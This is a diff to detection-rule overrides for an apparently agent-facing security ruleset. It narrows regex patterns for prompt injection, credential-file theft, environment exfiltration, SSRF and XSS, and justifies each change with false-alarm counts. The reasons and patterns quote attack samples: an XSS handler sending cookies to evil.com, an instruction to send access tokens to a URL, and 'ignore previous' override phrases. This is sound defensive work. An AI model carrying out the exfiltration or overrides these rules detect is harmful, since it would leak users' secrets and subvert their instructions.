@@ -71,12 +71,33 @@ ATR-2026-00113:
     between verb and target may no longer cross a `|`, which is what separates a
     command from a table cell. The one true_positive this condition carried,
     "Read the file at ~/.aws/credentials", still matches, as does condition 0.
+    Local conditions (2026-10-28, see the section below): on the developer's own files and
+    output, conditions 0, 2 and 3 fired 12 times in 500 public agent sessions on framework class
+    names (`TKTokenKeychain…`), an error message naming /etc/passwd and docs naming
+    ~/.docker/config.json. On local text a credential path follows a verb that acts on it, the
+    keychain tools stand as words, and /etc/passwd (no secrets) is dropped; the broad patterns
+    stay for text somebody else wrote, and all five true_positives match on every surface.
   conditions:
     - index: 1
       from: |-
         (?i)(?:cat|read|open|load|get)\s+.*(?:credentials|id_rsa|private[_\s]?key|secret[_\s]?key)
       to: |-
         (?i)(?:cat|read|open|load|get)\s+[^\n|]{0,60}(?:[~/]|\.\/)[\w./\\-]*(?:credentials|id_rsa|id_ed25519|private[_\s]?key|secret[_\s]?key)
+    - index: 0
+      from: |-
+        (?i)~/?\.(?:aws/credentials|ssh/id_(?:rsa|ed25519|ecdsa)|npmrc|netrc|docker/config\.json|kube/config)
+      local: |-
+        (?i)\b(?:cat|read|open|copy|cp|send|upload|post|dump|print|exfiltrat\w*|base64|scp|curl|load|extract|attach|share|paste|grab|steal|leak|include|pass|provide|forward|embed)\b[^\n|]{0,60}~/?\.(?:aws/credentials|ssh/id_(?:rsa|ed25519|ecdsa)|npmrc|netrc|docker/config\.json|kube/config)
+    - index: 2
+      from: |-
+        (?i)(?:keychain|credential-manager|secret-tool|security\s+find-(?:generic|internet)-password)
+      local: |-
+        (?i)(?:\bkeychain\b|\bcredential-manager\b|\bsecret-tool\b|security\s+find-(?:generic|internet)-password)
+    - index: 3
+      from: |-
+        (?i)/etc/(?:shadow|passwd|security/)|/var/lib/(?:jenkins|docker)/.*(?:secret|token|credential)
+      local: |-
+        (?i)/etc/(?:shadow|security/)|/var/lib/(?:jenkins|docker)/.*(?:secret|token|credential)
 
 ATR-2026-00117:
   reason: >-
@@ -100,12 +121,30 @@ ATR-2026-00030:
     agent-role noun is now required. This condition matched none of the rule's five
     true_positives before the change and none after it, so the recall it contributes
     is unmeasured either way; what changes is that it no longer convicts English.
+    Condition 2 (2026-10-28): `# type: ignore[override]`, the mypy pragma, satisfied the
+    case-insensitive `[OVERRIDE]` marker, 67 of 451 false alarms in 500 public agent sessions.
+    Only the exact pragma (`# type: ignore[override]`, `#type:ignore[override]`) is exempt, and
+    only for OVERRIDE: `ignore[OVERRIDE]` written by somebody else, `[ROOT]` and `[SUDO]` still
+    match, as do the rule's five true_positives, `<<SYS>>` and `<|im_start|>system`.
+    Condition 8 (2026-10-28): a failed status followed within 80 characters by "fallback" is
+    how changelogs and pull requests describe an ordinary retry; it now needs the redirect itself
+    ("switch to", "use alternative"), which its true_positive also has.
   conditions:
+    - index: 2
+      from: |-
+        (?i)(?<!["'`])(?<!:\s)(?:\[\s*(?:OVERRIDE|ROOT|SUDO)\s*\]|<<\s*SYS\s*>>|<\|im_start\|>system)
+      to: |-
+        (?i)(?<!["'`])(?<!:\s)(?:(?<!#\s{0,4}type:\s{0,4}ignore)\[\s*OVERRIDE\s*\]|\[\s*(?:ROOT|SUDO)\s*\]|<<\s*SYS\s*>>|<\|im_start\|>system)
     - index: 6
       from: |-
         (?i)(?:acting|speaking|operating)\s+(?:on\s+behalf\s+of|as\s+a?\s*proxy\s+for|in\s+place\s+of)\s+[a-zA-Z0-9_-]+\s*(?:agent)?
       to: |-
         (?i)(?:acting|speaking|operating)\s+(?:on\s+behalf\s+of|as\s+a?\s*proxy\s+for|in\s+place\s+of)\s+(?:the\s+)?(?:[a-zA-Z0-9_-]+\s+)?(?:agent|orchestrator|supervisor|coordinator|controller|assistant)\b
+    - index: 8
+      from: |-
+        (?i)(?:status|error|result)\s*[:=]\s*(?:failed|error|timeout|unauthorized).{0,80}(?:fallback|use\s+alternative|switch\s+to)
+      to: |-
+        (?i)(?:status|error|result)\s*[:=]\s*(?:failed|error|timeout|unauthorized).{0,80}(?:use\s+alternative|switch\s+to|fallback[^\n]{0,40}\b(?:disable|bypass|skip|ignore|turn\s+off)\b)
 
 ATR-2026-00032:
   reason: >-
@@ -390,3 +429,239 @@ ATR-2026-00419:
         (?i)\{[^}]{0,400}"mcp(?:Servers?|_servers?)"\s*:\s*\{[^}]{0,800}"command"\s*:\s*"(?:curl|wget)"
       to: |-
         (?i)(?="mcp(?:Servers?|_servers?)"\s*:\s*\{)(?<=\{[^}]{0,400})"mcp(?:Servers?|_servers?)"\s*:\s*\{[^}]{0,800}"command"\s*:\s*"(?:curl|wget)"
+
+# ---------------------------------------------------------------------------------------------
+# Local conditions (2026-10-28). An entry's `local:` keeps a condition's broad pattern for text
+# somebody else wrote (tool descriptions, MCP results, fetched pages and fetched command output,
+# dependency folders, instruction files) and reads a narrower pattern, or none (`off`), on the
+# developer's own files and program output (`repo_content`, `command_output`).
+#
+# Measured on 500 public coding-agent sessions with real execution (NVIDIA SWE-Hero OpenHands
+# trajectories, CC-BY-4.0, 191 repositories, 28,347 tool calls): with every rule on every surface,
+# 386 tool results were `suspect`, every one a false alarm, and a suspect result later denies the
+# session's network, secret and origin-suspect actions. Each narrower pattern below still matches
+# every true_positive of its rule on every surface (packages/core/test/rules/surface-recall.test.ts):
+# an instruction planted in a cloned repository arrives by `Read README.md`, `cat` or `git log`, so
+# the rule's own attacks must fire there too. Scoping whole rules away from local text was tried
+# first and reverted for exactly that reason.
+#
+# Two more forms (2026-10-28), for conditions whose broad pattern misfired on text somebody else
+# wrote as well (a teammate's pull request read with `gh`, a server's output over `ssh`): `to:`
+# narrows the condition on every surface, and `surfaces:` keeps it only on the surfaces it names,
+# for a pattern that is evidence only there (a credential file's name in a tool's description).
+# The same test holds every true_positive of the rule to every surface.
+# ---------------------------------------------------------------------------------------------
+
+ATR-2026-02019:
+  reason: >-
+    Condition 0 matched "run the following python code", which is how a library tells a person
+    what to do: 69 of 386 false alarms in 500 public agent sessions were one warning Modin
+    prints in command output ("…run the following python code before doing dataframe
+    operations"). On local text the phrase needs the colon that introduces the code, as in all
+    three true_positives; the role-assignment forms are unchanged.
+  conditions:
+    - index: 0
+      from: |-
+        (?i)\b(?:you(?:'re| are)|act\s+as)\s+(?:a\s+)?python\s+(?:interpreter|compiler|printer)\b|\brun\s+the\s+following\s+python\s+code\b|\bevaluate\s+the\s+following\s+print\s+statement\b
+      local: |-
+        (?i)\b(?:you(?:'re| are)|act\s+as)\s+(?:a\s+)?python\s+(?:interpreter|compiler|printer)\b|\brun\s+the\s+following\s+python\s+code\s*:|\bevaluate\s+the\s+following\s+print\s+statement\b
+
+ATR-2026-00554:
+  reason: >-
+    Condition 0 matched a dunder attribute in single braces, which is every f-string that prints
+    a type (`{x.__class__.__name__}`) and every printed dict of slots: 63 false alarms on code
+    and output. The template injection it names uses double braces in all three true_positives,
+    and on every surface it needs them: a pull request's file list read with `gh` as JSON is a
+    printed dict too.
+  conditions:
+    - index: 0
+      from: |-
+        (?i)\{\{?[^{}]*\b__(?:class|globals|import|builtins|subclasses|init|mro|base|dict|reduce|getattribute|subclasshook)__[^{}]*\}?\}
+      to: |-
+        (?i)\{\{[^{}]{0,2000}\b__(?:class|globals|import|builtins|subclasses|init|mro|base|dict|reduce|getattribute|subclasshook)__[^{}]{0,2000}\}\}|\{(?=[^{}]{0,400}__(?:mro|subclasses|globals|builtins|import)__)[^{}]{0,200}\.__(?:class|globals|import|builtins|subclasses|init|mro|base|dict|reduce|getattribute|subclasshook)__\s*\.\s*__(?:class|globals|import|builtins|subclasses|init|mro|base|dict|reduce|getattribute|subclasshook)__[^{}]{0,200}\}
+
+ATR-2026-00076:
+  reason: >-
+    Condition 0 matched `token: 0`, `Auth: False` and `signature: empty_like(`: 55 false alarms
+    on test output and code. On local text the value must be a whole word and the line must read
+    as a message (sender, agent, command, instruction, role), as the one true_positive it alone
+    catches does.
+  conditions:
+    - index: 0
+      from: |-
+        (?i)(?:auth(?:entication)?|signature|token|hmac|nonce)\s*[:=]\s*(?:null|none|empty|missing|undefined|false|0|"")
+      local: |-
+        (?i)\b(?:auth(?:entication)?|signature|token|hmac|nonce)\s*[:=]\s*(?:null|none|empty|missing|undefined|false|0|"")\b(?![\w.(])[^\n]{0,120}\b(?:sender|agent|from|command|instruction|message|role)\b
+
+ATR-2026-00060:
+  reason: >-
+    Condition 7 matched "can be used as a replacement for Numeric" in numpy's own README: 39
+    false alarms. Every true_positive is caught by the other conditions, so on local text
+    condition 7 is not read.
+  conditions:
+    - index: 7
+      from: |-
+        (?i)(?:(?:same|identical|equivalent|compatible)\s+(?:as|to|with)\s+(?:the\s+)?(?:official|original|standard)|(?:drop[-\s]?in\s+)?replacement\s+for)\s+[a-zA-Z_-]+
+      local: 'off'
+
+ATR-2026-00161:
+  reason: >-
+    Condition 2 is a credential file's name (`id_rsa`, `.env`, `known_hosts`, `/etc/passwd`) where a
+    tool's description should name none. On the developer's own code and command output it matched
+    `self.env.scope` (its `\b\.env` alternative only ever matches a name before `.env`, an attribute
+    in code) and an error naming /etc/passwd: 38 false alarms. There those two are dropped; the key
+    files (`id_rsa`, `known_hosts`, `~/.aws/credentials`) are read as before, and so is text
+    somebody else wrote. A listing of `~/.ssh` over `ssh` still flags (13 times in 2026-10 replays
+    of a developer's sessions); narrowing it there is left for a decision on that surface.
+  conditions:
+    - index: 2
+      from: |-
+        \b(?:id_rsa|id_dsa|id_ed25519|id_ecdsa)\b(?!\.pub)|\b(?:\.aws/credentials|\.kube/config|\.docker/config\.json|\.netrc|known_hosts)\b|/etc/(?:passwd|shadow|ssl/private)|/proc/self/environ|\b\.env(?:\.local|\.production|\.secret)?\b(?![/a-zA-Z])
+      local: |-
+        \b(?:id_rsa|id_dsa|id_ed25519|id_ecdsa)\b(?!\.pub)|\b(?:\.aws/credentials|\.kube/config|\.docker/config\.json|\.netrc|known_hosts)\b|/etc/(?:shadow|ssl/private)|/proc/self/environ
+
+ATR-2026-00440:
+  reason: >-
+    Conditions 0, 2 and 3 matched ordinary Python: `df.eval(expr)` in a lambda,
+    `Point.__subclasses__()` and `getattr(object, name, None)`: 28 false alarms. On local text
+    `eval(` must not be a method, the bare `__subclasses__()` alternative is dropped (every
+    true_positive reaches it through `().__class__`), and `getattr` counts only on
+    `__builtins__`.
+  conditions:
+    - index: 0
+      from: |-
+        (?i)lambda\s+\w*\s*:\s*[^,)]*\beval\s*\(
+      local: |-
+        (?i)lambda\s+\w*\s*:\s*[^,)]*(?<![.\w])eval\s*\(
+    - index: 2
+      from: |-
+        (?i)\(\s*\)\.__class__\.__mro__|tuple\s*\(\s*\)\.__class__|\(\s*\)\.__class__\.__bases__|__subclasses__\s*\(\s*\)
+      local: |-
+        (?i)\(\s*\)\.__class__\.__mro__|tuple\s*\(\s*\)\.__class__|\(\s*\)\.__class__\.__bases__
+    - index: 3
+      from: |-
+        (?i)BuiltinImporter|\btypes\.FunctionType\b|\bFunctionType\s*\(|getattr\s*\(\s*(?:object|type|__builtins__)
+      local: |-
+        (?i)BuiltinImporter|\btypes\.FunctionType\b|\bFunctionType\s*\(|getattr\s*\(\s*__builtins__
+
+ATR-2026-00115:
+  reason: >-
+    Condition 1 matched a bare `os.environ` or `process.env`, which is every program reading its
+    configuration: 27 false alarms on code and tests, and 9 on pull request diffs read with `gh`
+    in 2026-10 replays of real sessions. Outside tool descriptions and instruction files, where a
+    bare mention is evidence, it needs a send, post, upload, dump or log on the same line
+    (`requests.post(url, json=dict(os.environ))` still matches), as the two true_positives it alone
+    catches have. Condition 3 took "load .env" in a comment, a doc or a diff for an instruction (5
+    flags on `gh` output); outside those two surfaces it needs a send or an extract after the
+    file, as its two true_positives have. Condition 4 took `dotenv` near `axios` in a dependency
+    list printed by a command; no true_positive needs it, and it is off on local text only.
+  conditions:
+    - index: 1
+      from: |-
+        (?i)(?:process\.env|os\.environ|System\.getenv)(?!\[|\.|\w)
+      local: |-
+        (?i)(?:(?:process\.env|os\.environ|System\.getenv)(?!\[|\.|\w)[^\n]{0,60}\b(?:send|post|upload|log|dump|print|exfiltrat\w*|forward|transmit|collect|include|attach|get\s+all|share|reveal|expose|leak|paste|request|put|show|display)\b|\b(?:post|send|upload|urlopen|fetch|exfiltrat\w*|include|attach|share|reveal|expose|leak|paste|request|put|show|display)\b[^\n]{0,60}(?:process\.env|os\.environ|System\.getenv)(?!\[|\.|\w)|\b(?:params|json|data)\s*=\s*[^\n]{0,20}(?:process\.env|os\.environ|System\.getenv)(?!\[|\.|\w)|(?:process\.env|os\.environ|System\.getenv)(?!\[|\.|\w)[^\n]{0,60}\n[^\n]{0,80}\b(?:post|send|upload|urlopen|fetch|request|exfiltrat\w*|transmit)\b)
+      surfaces: [tool_description, instruction_file]
+    - index: 3
+      from: |-
+        (?i)(?:cat|read|load|parse)\s+.*\.env(?:\s|$|\.(?:local|prod|dev))
+      local: |-
+        (?i)\b(?:cat|read|load|parse)\s+[^\n]{0,120}?\.env(?:\s|$|\.(?:local|prod|dev))[^\n]{0,80}?\b(?:send|post|upload|extract|exfiltrat\w*|forward|transmit|collect|steal|leak|dump|share|e-?mail|paste|reveal|expose|request|display|show|print)\b
+      surfaces: [tool_description, instruction_file]
+    - index: 4
+      from: |-
+        (?i)(?:dotenv|load_dotenv|config\(\)).*(?:curl|fetch|http|request|post|send|axios)
+      local: 'off'
+
+ATR-2026-00202:
+  reason: >-
+    Condition 1 matched four `\xNN` escapes in a row, which test data and byte reprs are full of
+    (`\xd6\xc7\xde`): 24 false alarms in command output. The escapes must spell printable ASCII, as
+    the encoded "ignore" in its true_positive does, on every surface: byte reprs in a pull request
+    flagged as they did in command output. Condition 2 took two Cyrillic letters within 60
+    characters of "ignore", "override", "instruction" or "system prompt" for an injection, which any
+    Russian-language project is full of (`.gitignore`, Flutter's `IgnorePointer`, `re.IGNORECASE`,
+    Russian notes next to "override"): 33 flags in 2026-10 replays of real sessions, each tainting
+    the session. It needs the override itself, "ignore previous" and its kin, before the Cyrillic
+    words, as its true_positive "ignore previous инструкции" has, on every surface: a teammate's pull
+    request written in Russian next to `.gitignore` flagged the same way, and homoglyphs inside the
+    English words are folded before any rule reads the text, so the broad form caught nothing more.
+  conditions:
+    - index: 1
+      from: |-
+        (?:\\x[0-9a-fA-F]{2}){4,}
+      to: |-
+        (?:\\x(?:[2-6][0-9a-fA-F]|7[0-9a-eA-E])){4,}
+    - index: 2
+      from: |-
+        (?i)(?:(?:ignore|override|disregard|circumvent|forget|bypass|system\s+prompt|instructions?)[^\n]{0,60}[\u0430\u0435\u043e\u0440\u0441\u0443\u0445]{2,}|[\u0430\u0435\u043e\u0440\u0441\u0443\u0445]{2,}[^\n]{0,60}(?:ignore|override|disregard|circumvent|forget|bypass|system\s+prompt|instructions?))
+      to: |-
+        (?i)\b(?:(?:ignore|disregard|forget|bypass)\s+(?:all\s+|any\s+)?(?:the\s+|your\s+|my\s+|these\s+|those\s+)?(?:previous|prior|earlier|above|system|original|instructions?|rules?|guidelines?|directives?|prompts?)|override\s+(?:(?:all|any)\s+(?:(?:the|your|my|these|those)\s+)?(?:previous|prior|earlier|above|system|original|instructions?|rules?|guidelines?|directives?|prompts?)|(?:the|your|my|these|those)\s+(?:previous|prior|earlier|above|system|original|instructions?|rules?|guidelines?|directives?|prompts?)|previous|prior|earlier|above|system|original))\b[^\n]{0,60}[\u0430\u0435\u043e\u0440\u0441\u0443\u0445]{2,}
+
+# Flags of 2026-10-29 on a developer's own plans and security tests, read as attacks: in one replayed
+# session they made 388 questions about every later call that read `.env`, and the same XSS test
+# printed by a test runner in the project's container tainted it for 208 more. The two XSS conditions
+# are narrowed on every surface (an `alert` alone is a proof, not an attack on the agent); the other
+# two on local text only.
+
+ATR-2026-00114:
+  reason: >-
+    Condition 0 took an HTTP method and a token word anywhere on a line for an instruction to send a
+    token, which is how a project documents its own API (`POST {base}/api/v1/...` with an
+    `api_access_token` header, `Authorization: Bearer {LLM_API_KEY}` in a plan): in a 2026-10 replay
+    of a developer's session it flagged the plans the agent itself had written, and every later call
+    that read `.env` was asked about. On local text it needs a destination after the token (`to`,
+    `into`, `at` or `via` an address, a host or an IP), as its true_positive "Send the access_token
+    to https://..." has.
+  conditions:
+    - index: 0
+      from: |-
+        (?i)(?:send|forward|post|transmit|exfil)\s+.*(?:access_token|refresh_token|bearer|api[_\s]?key|auth[_\s]?token)
+      local: |-
+        (?i)\b(?:send|forward|post|transmit|exfil\w*)\s+(?:the\s+|your\s+|all\s+|my\s+|our\s+)?[^\n]{0,60}?(?:access_token|refresh_token|bearer|api[_\s]?key|auth[_\s]?token)[^\n]{0,80}?\b(?:to|into|at|via|on)\s+[`'"<(\[]*(?:https?://|(?:[\w-]+\.)+[a-z]{2,}\b|\d{1,3}(?:\.\d{1,3}){3}|\[[0-9a-f:.]+\])
+
+ATR-2026-00568:
+  reason: >-
+    Condition 0 took the cloud metadata address alone for an attack, which is how a project's own
+    SSRF tests and notes name what they block (`waiting on 169.254.169.254`, a test's
+    `<img src="http://169.254.169.254/">`, a test logo at `http://169.254.169.254/logo.png`). On
+    local text it needs a metadata path after the address, however it is spelled (`/latest/meta-data`,
+    `//latest`, `/./latest`, `/%6catest`), as its true_positives have. `file://` system paths,
+    `gopher://` and `dict://` are read as before.
+  conditions:
+    - index: 0
+      from: |-
+        (?i)(?:169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200|fd00:ec2::254)(?:[:/]|\b)|\bfile://(?:/?(?:etc|proc|root|home|var/run|sys)/)|\bgopher://|\bdict://
+      local: |-
+        (?i)(?:169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200|fd00:ec2::254)(?::\d+)?(?:(?:/|%2f)+(?:\.{1,2}(?:/|%2f)+)*)(?:latest|computeMetadata|metadata|openstack|opc|v1|v2|20\d\d-|%[0-9a-f]{2})|\bfile://(?:/?(?:etc|proc|root|home|var/run|sys)/)|\bgopher://|\bdict://
+
+ATR-2026-00571:
+  reason: >-
+    Condition 0 took an event handler that calls `alert` for an attack, which is what a project's own
+    XSS tests feed its sanitiser (`<img src=x onerror=alert(1)>`), and the same test printed by a
+    test runner in the project's container tainted a replayed session for 208 calls. The handler
+    must reach for something to steal or a way to run code within its value (the cookie, storage,
+    `fetch(`, a URL, `eval`, `atob`, `import(`, `Function`, a timer or a constructor given a string,
+    `window.location` and its kin, a property by brackets), as its true_positive
+    `onerror=alert(document.cookie)` does, on every surface: an `alert` alone is a proof, not an
+    attack on the agent.
+  conditions:
+    - index: 0
+      from: |-
+        (?i)\bon(?:error|load|mouseover|click|focus|toggle)\s*=\s*[\"']?\s*(?:alert|eval|fetch|document\.(?:cookie|location|write)|window\.|location\s*=|String\.fromCharCode|atob)\b
+      to: |-
+        (?i)\bon(?:error|load|mouseover|click|focus|toggle)\s*=\s*(?:"[^"]{0,300}?(?:document\.cookie|localStorage|sessionStorage|\bfetch\s*\(|new\s+Image|XMLHttpRequest|sendBeacon|https?://|[\"'(]\s*//[\w-]+\.|\beval\s*\(|\batob\s*\(|String\.fromCharCode|location\s*=|\bimport\s*\(|\b(?:window|document|top|self|parent|globalThis|frames)\s*\[|document\.(?:write|location)|\b(?:window|top|self|parent|globalThis)\.(?:location|open|eval|name)\b|\b(?:setTimeout|setInterval|Function|constructor)\s*\(\s*['\"`]|\bsrc\s*=\s*['\"]?\s*//)|'[^']{0,300}?(?:document\.cookie|localStorage|sessionStorage|\bfetch\s*\(|new\s+Image|XMLHttpRequest|sendBeacon|https?://|[\"'(]\s*//[\w-]+\.|\beval\s*\(|\batob\s*\(|String\.fromCharCode|location\s*=|\bimport\s*\(|\b(?:window|document|top|self|parent|globalThis|frames)\s*\[|document\.(?:write|location)|\b(?:window|top|self|parent|globalThis)\.(?:location|open|eval|name)\b|\b(?:setTimeout|setInterval|Function|constructor)\s*\(\s*['\"`]|\bsrc\s*=\s*['\"]?\s*//)|[^\s"'>]{0,300}?(?:document\.cookie|localStorage|sessionStorage|\bfetch\s*\(|new\s+Image|XMLHttpRequest|sendBeacon|https?://|[\"'(]\s*//[\w-]+\.|\beval\s*\(|\batob\s*\(|String\.fromCharCode|location\s*=|\bimport\s*\(|\b(?:window|document|top|self|parent|globalThis|frames)\s*\[|document\.(?:write|location)|\b(?:window|top|self|parent|globalThis)\.(?:location|open|eval|name)\b|\b(?:setTimeout|setInterval|Function|constructor)\s*\(\s*['\"`]|\bsrc\s*=\s*['\"]?\s*//))
+
+ATR-2026-01451:
+  reason: >-
+    Condition 0 took any `<img … onerror=…>` for an injection, which is what a project's own XSS tests
+    hold, on any surface they are printed on. The handler must reach for something to steal or a way
+    to run code, as its true_positives `onerror=fetch('https://evil.com/?c='+document.cookie)` and
+    `onerror='eval(atob(...))'` do, or carry the `PLACEHOLDER` an injection test asks to be echoed,
+    as the other two do.
+  conditions:
+    - index: 0
+      from: |-
+        (?i)<img\b[^>]{0,200}\bonerror\s*=\s*['"]?(?!this\.src)[^>"']{0,300}
+      to: |-
+        (?i)<img\b[^>]{0,200}\bonerror\s*=\s*(?:"(?!this\.src)[^"]{0,300}?(?:document\.cookie|localStorage|sessionStorage|\bfetch\s*\(|new\s+Image|XMLHttpRequest|sendBeacon|https?://|[\"'(]\s*//[\w-]+\.|\beval\s*\(|\batob\s*\(|String\.fromCharCode|location\s*=|\bimport\s*\(|\b(?:window|document|top|self|parent|globalThis|frames)\s*\[|document\.(?:write|location)|\b(?:window|top|self|parent|globalThis)\.(?:location|open|eval|name)\b|\b(?:setTimeout|setInterval|Function|constructor)\s*\(\s*['\"`]|\bsrc\s*=\s*['\"]?\s*//)|'(?!this\.src)[^']{0,300}?(?:document\.cookie|localStorage|sessionStorage|\bfetch\s*\(|new\s+Image|XMLHttpRequest|sendBeacon|https?://|[\"'(]\s*//[\w-]+\.|\beval\s*\(|\batob\s*\(|String\.fromCharCode|location\s*=|\bimport\s*\(|\b(?:window|document|top|self|parent|globalThis|frames)\s*\[|document\.(?:write|location)|\b(?:window|top|self|parent|globalThis)\.(?:location|open|eval|name)\b|\b(?:setTimeout|setInterval|Function|constructor)\s*\(\s*['\"`]|\bsrc\s*=\s*['\"]?\s*//)|(?!['"]|this\.src)[^\s"'>]{0,300}?(?:document\.cookie|localStorage|sessionStorage|\bfetch\s*\(|new\s+Image|XMLHttpRequest|sendBeacon|https?://|[\"'(]\s*//[\w-]+\.|\beval\s*\(|\batob\s*\(|String\.fromCharCode|location\s*=|\bimport\s*\(|\b(?:window|document|top|self|parent|globalThis|frames)\s*\[|document\.(?:write|location)|\b(?:window|top|self|parent|globalThis)\.(?:location|open|eval|name)\b|\b(?:setTimeout|setInterval|Function|constructor)\s*\(\s*['\"`]|\bsrc\s*=\s*['\"]?\s*//)|[^>]{0,300}?PLACEHOL[DE]{1,2}R)
